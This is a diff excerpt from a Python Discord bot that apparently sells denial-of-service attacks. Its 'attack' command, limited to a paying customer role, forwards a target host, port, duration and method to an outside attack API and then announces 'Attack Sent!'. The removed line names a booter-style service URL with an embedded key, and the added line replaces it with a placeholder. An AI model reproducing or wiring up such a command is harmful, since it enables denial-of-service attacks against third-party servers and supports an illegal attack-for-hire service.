@@ -99,7 +99,7 @@ async def tools(ctx):
 @bot.command()
 @has_role("Xuzcia Customers")
 async def attack(ctx, host, port, time, method):
-        requests.get('http://emberservices.cf/EmberApi.php?host='+host+'&port='+port+'&time='+time+'&method='+method+'&key=9s8d9sjdx9sdraco')
+        requests.get('API HERE')
         sent = discord.Embed(title=f"𝘼𝙩𝙩𝙖𝙘𝙠 𝙎𝙚𝙣𝙩!:tm:", color=0x000000)
         sent.add_field(name="𝙃𝙤𝙨𝙩:", value=f"{host}", inline=False)
         sent.add_field(name="𝙋𝙤𝙧𝙩:", value=f"{port}", inline=False)
